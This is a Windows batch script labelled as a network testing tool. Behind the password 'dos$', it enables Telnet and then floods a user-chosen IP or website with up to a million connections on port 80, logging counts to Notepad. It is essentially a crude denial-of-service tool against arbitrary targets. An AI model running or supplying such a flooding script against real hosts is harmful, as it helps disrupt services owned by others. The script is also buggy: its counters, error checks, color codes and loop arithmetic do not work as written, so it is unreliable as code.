@echo off
setlocal

REM Enable ANSI escape codes in Windows Command Prompt
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1

REM Define ANSI color codes for rainbow colors
set "RED=\e[31m"
set "GREEN=\e[32m"
set "YELLOW=\e[33m"
set "BLUE=\e[34m"
set "MAGENTA=\e[35m"
set "CYAN=\e[36m"
set "RESET=\e[0m"

REM ==============================================
REM MPS VMini - Network Testing Tool
REM ==============================================

REM ASCII Art Title: MPS
echo.
echo.
echo.      %RED%__  __ %GREEN%____  %YELLOW%____%BLUE%  
echo.     %MAGENTA%|  \/  |%CYAN%  _ \%RED%/ ___| 
echo.     %GREEN%| |\/| |%YELLOW% |_) \%BLUE%\___ \ 
echo.     %MAGENTA%| |  | |%CYAN%  __/%RED% ___) |
echo.     %GREEN%|_|  |_|%YELLOW%_|  %BLUE% |____/ 
echo.
echo.

REM ==============================================
REM Password Protection
REM ==============================================

set "password=dos$"
echo %RED%Enter the password to continue: %RESET%
set /p userpass=
if not "%userpass%"=="%password%" (
    echo %RED%Incorrect password. Exiting...%RESET%
    pause
    exit /b
)

REM ==============================================
REM Check if Telnet is installed
REM ==============================================

where telnet >nul 2>&1
if %errorlevel% equ 0 (
    goto StartScript
) else (
    echo %RED%Telnet is not installed.%RESET%
    echo.
    echo %GREEN%Enabling Telnet Client via DISM...%RESET%
    REM Run DISM to enable Telnet Client
    dism /online /Enable-Feature /FeatureName:TelnetClient /NoRestart
    if %errorlevel% equ 0 (
        echo %GREEN%Telnet Client has been enabled successfully.%RESET%
        goto StartScript
    ) else (
        echo %RED%Failed to enable Telnet Client. Please run this script as Administrator.%RESET%
        pause
        exit /b
    )
)

:StartScript
REM ==============================================
REM Prompt User for Target IP or Website
REM ==============================================

echo %BLUE%Enter the target IP or website: %RESET%
set /p target=
if "%target%"=="" (
    echo %RED%No target specified. Exiting...%RESET%
    pause
    exit /b
)

REM Set the number of connections to make
echo %YELLOW%Enter the number of connections to make (default is 1000, max is 1000000): %RESET%
set /p packets=
if "%packets%"=="" set packets=1000
if %packets% gtr 1000000 set packets=1000000

REM ==============================================
REM Initialize Stats
REM ==============================================

set "statsFile=%temp%\stats.txt"
echo %MAGENTA%Connection Stats%RESET% > "%statsFile%"
echo %CYAN%-----------------%RESET% >> "%statsFile%"
echo %GREEN%Packets Sent: 0%RESET% >> "%statsFile%"
echo %YELLOW%Data Sent: 0 MB (0 GB)%RESET% >> "%statsFile%"
start notepad "%statsFile%"

REM ==============================================
REM Make TCP Connections Using Telnet
REM ==============================================

echo %RED%Starting %packets% TCP connections to %target%...%RESET%
echo %GREEN%Press Ctrl+C to stop at any time.%RESET%

set /a packetCount=0
set /a dataSent=0

REM Outer loop for thousands
for /L %%a in (1,1,%packets:~0,-3%) do (
    REM Inner loop for hundreds
    for /L %%b in (1,1,1000) do (
        echo quit | telnet %target% 80 >nul
        if %errorlevel% equ 0 (
            echo %GREEN%Successfully connected to %target% (Connection %%a-%%b)%RESET%
        ) else (
            echo %RED%Failed to connect to %target% (Connection %%a-%%b)%RESET%
        )
        set /a packetCount+=1
        set /a dataSent+=64  REM Assuming 64 bytes per packet
        set /a dataSentMB=dataSent/1048576
        set /a dataSentGB=dataSent/1073741824
        echo %BLUE%Packets Sent: %packetCount%%RESET% > "%statsFile%"
        echo %MAGENTA%Data Sent: %dataSentMB% MB (%dataSentGB% GB)%RESET% >> "%statsFile%"
    )
)

echo %CYAN%All TCP connections attempted!%RESET%
pause
